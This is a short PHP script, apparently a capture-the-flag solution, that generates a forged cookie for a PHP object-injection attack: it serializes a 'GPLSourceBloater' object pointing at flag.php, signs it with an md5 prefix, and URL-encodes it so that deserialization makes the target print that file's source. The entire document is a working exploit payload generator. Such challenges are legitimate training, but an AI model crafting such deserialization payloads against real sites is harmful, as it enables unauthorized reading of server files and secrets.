<?php
Class GPLSourceBloater{
    public $source;

    public function __toString()
    {
        return highlight_file('license.txt', true).highlight_file($this->source, true);
    }
}

$s = new GPLSourceBloater();
$s->source = "flag.php";

$todos = [$s];

$payload = serialize($todos);
$h = md5($payload);

$cookie = urlencode($h . $payload);
echo $cookie . "\n";

?>